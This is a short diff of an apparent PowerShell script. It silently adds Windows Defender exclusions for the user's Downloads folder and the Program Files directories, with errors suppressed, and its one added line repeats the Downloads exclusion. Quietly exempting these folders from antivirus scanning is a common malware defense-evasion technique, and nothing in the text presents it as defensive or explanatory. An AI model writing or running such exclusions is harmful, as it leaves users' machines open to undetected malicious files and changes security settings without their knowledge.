@@ -41,6 +41,7 @@ try {
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 } catch {
     # Silently continue if Windows Defender is not available
 }
